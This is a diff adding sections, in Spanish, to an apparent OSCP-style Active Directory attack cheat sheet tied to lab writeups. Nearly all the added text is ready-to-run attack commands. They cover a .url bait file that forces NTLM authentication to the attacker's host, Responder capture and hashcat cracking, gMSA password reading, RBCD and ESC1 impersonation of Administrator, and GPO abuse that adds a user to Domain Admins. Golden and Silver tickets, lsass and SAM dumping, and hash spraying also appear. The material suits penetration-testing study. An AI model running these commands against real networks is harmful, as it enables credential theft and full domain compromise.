@@ -190,7 +190,13 @@ smb: \> get "Notice from HR.txt"       # revisa TODO, incluso lo que suena a "re
 nxc smb <IP> -u '<user>' -p '<pass>' --users
 # Lee la columna -Description- de CADA usuario, no solo el nombre — es fácil
 # pasarla por alto si solo miras la lista de usernames.
+
+# Vía LDAP (Hutch): nunca leas el volcado a ojo, FÍLTRALO siempre.
+ldapsearch -x -H ldap://<IP> -b "DC=dominio,DC=com" > ldap_dump.txt
+grep -i -E "descr|pass|pwd|comment|info|key|secret" ldap_dump.txt
+nxc ldap <IP> -u '' -p '' -M get-desc-users     # saca descripciones directo
 ```
+> 🔴 **Una credencial que valida en SMB/LDAP pero NO en WinRM no es un callejón sin salida** (Hutch, [`writeups/hutch-laps-writeup.md`](writeups/hutch-laps-writeup.md)). Valídala por los 3 vectores (`nxc smb/ldap/winrm`); aunque no te dé shell, sirve para enumerar ACLs vía LDAP. La pregunta correcta no es *¿dónde puedo loguear?* sino **¿qué permisos tiene este usuario sobre otros objetos?** → si puede leer `ms-Mcs-AdmPwd` (LAPS) de un equipo, tienes el Administrator local de ese equipo (`nxc ldap <IP> -u <user> -p '<pass>' -M laps`).
 
 **3. Scripts de automatización (`.ps1`, `.bat`) en shares, con credenciales hardcodeadas** — común en scripts de backup/sync que necesitan autenticarse sin intervención humana:
 ```powershell
@@ -1355,6 +1361,189 @@ type tmp.hex
 
 ---
 
+## FASE 2c — NTLM theft / forced authentication (share escribible, SIN credenciales)
+
+> Vector real de **Vault** (writeup: [`writeups/vault-gpo-writeup.md`](writeups/vault-gpo-writeup.md)). Si tienes **escritura** en un share que alguien navega, dejas un cebo que fuerza a Windows a autenticarse contra tu Kali y capturas el **Net-NTLMv2**. Aquí Responder se usa como **listener pasivo** (modo análisis), NO como poisoning LLMNR/NBT-NS — la autenticación la provoca el propio cebo. Aun así, confirma la política del examen antes de usarlo.
+
+```bash
+# 1. Levanta Responder como listener (SMB/HTTP ON)
+sudo responder -I tun0
+#    Los hashes se guardan en /usr/share/responder/logs/ — no te fíes solo de la pantalla
+#    (solo imprime cada hash único UNA vez por sesión).
+
+# 2. Crea el cebo .url — el truco está en IconFile apuntando a una UNC hacia ti.
+#    Para pintar el icono, el Explorer sale por SMB a esa ruta → suelta el hash.
+cat > '@cebo.url' <<'EOF'
+[InternetShortcut]
+URL=http://x/
+WorkingDirectory=x
+IconFile=\\<IP_TUN0>\share\icon.ico
+IconIndex=1
+EOF
+#    El '@' al inicio del nombre lo coloca arriba del todo (se renderiza antes).
+
+# 3. Súbelo a la RAÍZ del share (no en una subcarpeta — ahí no dispara)
+smbclient //<IP>/<share> -U '<user>'
+#   smb: \> put '@cebo.url'
+
+# 4. Espera la captura y crackea
+watch -n 5 'cat /usr/share/responder/logs/SMB-NTLMv2-SSP-*.txt 2>/dev/null'
+hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
+```
+
+> 🔴 **Dos confusiones que cuestan tiempo** (lección de **Heist**, [`writeups/heist-writeup.md`](writeups/heist-writeup.md)):
+> - **Un navegador NO habla SMB/UNC.** Si fuerzas la autenticación a través de un Chromium headless (SSRF), el cebo debe ser una URL `http://<KALI>/x`, no `\\<KALI>\x`. El UNC solo lo abre el Explorer/cliente SMB.
+> - **`tcpdump` NO captura el hash**, solo te confirma si el tráfico del target llega a tu Kali (`sudo tcpdump -i tun0 host <IP>`). Quien captura es Responder. Son roles distintos.
+
+> Otros cebos: `.lnk`, `.scf` (parcheado en Windows modernos), `.library-ms` (CVE-2025-24071, ver FASE 2b). El `.url` con `IconFile` es el más fiable hoy.
+
+---
+
+## FASE 5i — gMSA: leer la contraseña de una cuenta de servicio gestionada
+
+> Vector de **Heist**. Una **gMSA** (group Managed Service Account) tiene su contraseña gestionada y rotada por el DC — nadie la sabe, pero ciertos grupos pueden **leerla** (en forma de hash NT). Si tu usuario está en `PrincipalsAllowedToReadPassword`, la robas.
+
+```bash
+# Un solo comando con nxc:
+nxc ldap <IP> -u <user> -p '<pass>' --gmsa
+# Salida:
+#   Account: svc_apache$   NTLM: d555...c6a1
+#   PrincipalsAllowedToReadPassword: ['DC01$', 'Web Admins']   ← ¿estás en ese grupo?
+
+# Con el hash NT de la gMSA → Pass-the-Hash (no necesitas la clave en claro):
+nxc smb   <IP> -u 'svc_apache$' -H d555...c6a1
+evil-winrm -i <IP> -u 'svc_apache$' -H d555...c6a1
+```
+> El `$` final del nombre de la cuenta de máquina/gMSA va **entre comillas simples** para que la shell no lo interprete. Alternativa: `impacket-gMSADumper` / `bloodyAD get object <gmsa$> --attr msDS-ManagedPassword`.
+
+---
+
+## FASE 8d — RBCD (Resource-Based Constrained Delegation)
+
+> Escalada de **ResourceD** (writeup: [`writeups/resourced-writeup.md`](writeups/resourced-writeup.md)). **Requisitos:** (1) poder crear una cuenta de máquina (`SeMachineAccountPrivilege`, o `ms-DS-MachineAccountQuota > 0`, por defecto 10), y (2) poder escribir `msDS-AllowedToActOnBehalfOfOtherIdentity` sobre el equipo objetivo (`GenericAll`/`GenericWrite`/`WriteDacl` sobre `DC$` — confírmalo en BloodHound).
+
+```bash
+# Prep: Kerberos es estricto con DNS y reloj
+echo '<IP> dc.dominio.local dominio.local DC' | sudo tee -a /etc/hosts
+sudo ntpdate <IP>        # evita KRB_AP_ERR_SKEW (o usa faketime)
+
+# 1. Crear una máquina controlada por ti
+impacket-addcomputer dominio.local/<user> -hashes :<NThash> \
+  -computer-name 'FAKE01$' -computer-pass 'Fake1234!' -dc-ip <IP>
+
+# 2. Escribir la delegación en el objetivo (el DC confía en FAKE01$)
+impacket-rbcd -delegate-from 'FAKE01$' -delegate-to 'DC$' -action write \
+  dominio.local/<user> -hashes :<NThash> -dc-ip <IP>
+
+# 3. Pedir un ticket de servicio suplantando a Administrator (S4U2Self + S4U2Proxy)
+impacket-getST -spn 'cifs/dc.dominio.local' -impersonate Administrator \
+  'dominio.local/FAKE01$:Fake1234!' -dc-ip <IP>
+#   El SPN va con FQDN, NUNCA con IP (Kerberos valida por nombre).
+
+# 4. Usar el ticket → SYSTEM en el DC
+export KRB5CCNAME=Administrator@cifs_dc.dominio.local@DOMINIO.LOCAL.ccache
+impacket-psexec -k -no-pass dc.dominio.local
+#   Variantes con el mismo ticket: impacket-wmiexec -k -no-pass ... / impacket-secretsdump -k -no-pass ...
+```
+> **Pista de que este es el camino:** `whoami /priv` muestra `SeMachineAccountPrivilege` **y** BloodHound da `GenericAll`/`GenericWrite` sobre el objeto del DC (o de otra máquina). Limpieza: `impacket-rbcd -action flush` y borra `FAKE01$`.
+
+---
+
+## FASE 8e — GPO abuse (editar una GPO que aplica al DC)
+
+> Escalada de **Vault**. Si tienes permiso de edición (`GpoEdit` / `GpoEditDeleteModifySecurity` / arista `WriteGPLink` en BloodHound) sobre una GPO que aplica al DC — típicamente la **Default Domain Policy** (GUID fijo `31B2F340-016D-11D2-945F-00C04FB984F9`) — inyectas una tarea inmediata que corre **como SYSTEM**.
+
+```bash
+# Enumerar GPOs escribibles (desde shell Windows, módulo GroupPolicy):
+#   Get-GPO -All | %{ Get-GPPermission -Guid $_.Id -All } |
+#     ? { $_.Permission -match 'Edit' -and $_.Trustee.Name -eq $env:USERNAME }
+
+# Abusar desde Kali con pyGPOAbuse (con pass o hash):
+git clone https://github.com/Hackndo/pyGPOAbuse && cd pyGPOAbuse
+python3 pygpoabuse.py dominio.local/<user>:'<pass>' \
+  -gpo-id '31B2F340-016D-11D2-945F-00C04FB984F9' \
+  -command 'net group "Domain Admins" <user> /add /domain' \
+  -taskname 'Update' -description 'Update'
+```
+```powershell
+# Alternativa desde shell Windows: SharpGPOAbuse (evita grupos con espacios → usa Administrators)
+.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author dominio\<user> `
+  --Command "cmd.exe" --Arguments "/c net localgroup Administrators <user> /add" --GPOName "Default Domain Policy"
+
+# Aplicar y RECONECTAR (el token solo recoge el grupo nuevo en un login nuevo):
+gpupdate /force
+```
+> En un DC, el grupo local **Administrators** equivale a admin del dominio y se escribe sin las comillas problemáticas de `"Domain Admins"`.
+
+---
+
+## FASE 8f — AD CS ESC1 (plantilla de certificado vulnerable)
+
+> Complemento de la FASE 8c (ESC16). **ESC1** = una plantilla permite que un usuario de bajo privilegio pida un certificado **especificando un SAN arbitrario** (ej: `administrator@dominio.local`) → autenticas como esa identidad.
+
+```bash
+# 1. Encontrar plantillas vulnerables
+certipy find -u <user>@dominio.local -p '<pass>' -dc-ip <IP> -vulnerable -stdout
+#    Busca "ESC1" y el nombre de la plantilla + la CA.
+
+# 2. Pedir un cert suplantando a Administrator vía SAN (-upn)
+certipy req -u <user>@dominio.local -p '<pass>' -dc-ip <IP> \
+  -ca '<CA_NAME>' -template '<TEMPLATE>' -upn administrator@dominio.local
+#    Genera administrator.pfx
+
+# 3. Autenticar con el cert → hash NT de Administrator (o TGT)
+certipy auth -pfx administrator.pfx -dc-ip <IP>
+#    → hash NT → Pass-the-Hash al DC
+```
+> Si `certipy` no detecta la vuln que esperas, **actualízalo** antes de descartar (`pip install certipy-ad --upgrade --break-system-packages`).
+
+---
+
+## FASE 9b — Overpass-the-Hash y tickets (persistencia, OPCIONAL en OSCP)
+
+> Útiles si el vector lo pide; **Golden/Silver Ticket son más de persistencia** que de camino — en OSCP rara vez son el único camino, pero conviene reconocerlos.
+
+```bash
+# Overpass-the-Hash: hash NTLM → ticket Kerberos (cuando NTLM está bloqueado pero Kerberos no)
+impacket-getTGT dominio.local/<user> -hashes :<NThash>
+export KRB5CCNAME=<user>.ccache
+impacket-psexec -k -no-pass dc.dominio.local
+
+# Golden Ticket: con el hash de krbtgt (tras DCSync) forjas un TGT de cualquier usuario
+impacket-ticketer -nthash <krbtgt_hash> -domain-sid <SID> -domain dominio.local Administrator
+#   -> Administrator.ccache ; export KRB5CCNAME y usa psexec -k -no-pass
+
+# Silver Ticket: con el hash de una cuenta de servicio forjas un TGS para ESE servicio concreto
+impacket-ticketer -nthash <svc_hash> -domain-sid <SID> -domain dominio.local -spn cifs/host.dominio.local Administrator
+```
+> El `domain-sid` lo sacas con `impacket-lookupsid` o `nxc ... --rid-brute`. Estos dos no "encuentran" el camino, lo **mantienen** una vez ya tienes el hash de krbtgt/servicio.
+
+---
+
+## FASE 5j — Volcado de credenciales en memoria (lsass) y resumen de dumps
+
+Una vez con SYSTEM/admin local, además de SAM (FASE 5g) puedes volcar credenciales **vivas** de memoria:
+
+```bash
+# Remoto, con credenciales de admin local:
+nxc smb <IP> -u Administrator -p '<pass>' --lsa          # secretos LSA
+nxc smb <IP> -u Administrator -p '<pass>' --sam          # hashes locales (SAM)
+nxc smb <IP> -u Administrator -H <hash>   -M lsassy      # lsass → creds en claro/NTLM
+
+# Desde shell Windows (mimikatz, si lo subes):
+#   privilege::debug ; sekurlsa::logonpasswords ; lsadump::sam
+```
+| Qué quiero | Fuente | Comando |
+|------------|--------|---------|
+| Hashes locales de esa máquina | SAM + SYSTEM | `reg save` + `secretsdump ... LOCAL`, o `nxc --sam` |
+| Credenciales vivas en memoria | lsass | `nxc -M lsassy`, mimikatz `sekurlsa::logonpasswords` |
+| TODOS los hashes del dominio | ntds.dit (DCSync) | `secretsdump dominio/user@DC -just-dc` |
+| ntds.dit desde un backup en un share | ntds.dit + SYSTEM | `secretsdump -ntds ntds.dit -system SYSTEM local` |
+
+> **Patrón de backup de AD** (ResourceD): si encuentras `ntds.dit` + el hive `SYSTEM` en un share, vuelcas **offline** todos los hashes. Como el backup suele estar viejo, **no adivines cuál sirve**: hash-spray todos y deja que el DC marque los `[+]` válidos (`nxc smb <IP> -u users.txt -H hashes.txt --continue-on-success | grep '\[+\]'`).
+
+---
+
 ## Resumen del flujo completo
 
 ```
@@ -1382,9 +1571,11 @@ nmap/rustscan (identificar puertos AD) → agregar DC a /etc/hosts
    → DCSync (directo si ya tienes el edge, o vía cadena ACL con net rpc/ldapmodify/bloodyAD + dacledit)
    → ¿GenericWrite/GenericAll sobre una CUENTA (no grupo)? → Shadow Credentials
      (certipy shadow auto) en vez de resetear password
-   → ¿sin DCSync ni ACL útil? → LAPS (nxc ldap -M laps), Azure AD Connect
-     (grupo "Azure Admins", cuentas AAD_*, servicio ADSync), o AD CS/ESC16 (certipy find
-     -vulnerable → cambiar UPN → pedir certificado → certipy auth)
+   → ¿sin DCSync ni ACL útil? → LAPS (nxc ldap -M laps), gMSA (nxc --gmsa → hash NT),
+     Azure AD Connect (grupo "Azure Admins", cuentas AAD_*, servicio ADSync),
+     AD CS (certipy find -vulnerable → ESC1 vía SAN / ESC16 vía UPN → certipy auth),
+     RBCD (SeMachineAccountPrivilege + escritura sobre DC$ → addcomputer/rbcd/getST),
+     o GPO abuse (GpoEdit sobre la Default Domain Policy → pyGPOAbuse → tarea SYSTEM)
    → Pass-the-Hash al DC (o password de LAPS) con el hash/pass del Administrator
    → flags (user.txt / root.txt / proof.txt) — Administrator lee CUALQUIER carpeta,
      no necesitas ser el usuario dueño de la flag
